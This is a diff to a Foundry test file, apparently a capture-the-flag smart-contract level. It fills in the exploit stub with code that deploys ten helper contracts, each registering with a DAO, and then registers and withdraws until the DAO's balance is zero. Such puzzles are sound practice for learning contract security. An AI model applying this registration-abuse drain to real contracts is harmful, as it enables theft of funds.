@@ -42,12 +42,24 @@ contract DAO2Test is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        vm.startBroadcast();
+        for (uint i = 0; i < 10; i++) {
+            new Hack(instance);
+        }
+        instance.register();
+        instance.withdraw();
+        vm.stopBroadcast();
 
         checkSuccess();
     }
 
     function checkSuccess() internal view override {
         assertTrue(address(instance).balance == 0, "Solution is not solving the level");
+    }
+}
+
+contract Hack {
+    constructor(DAO _daoInstance) {
+        _daoInstance.register();
     }
 }
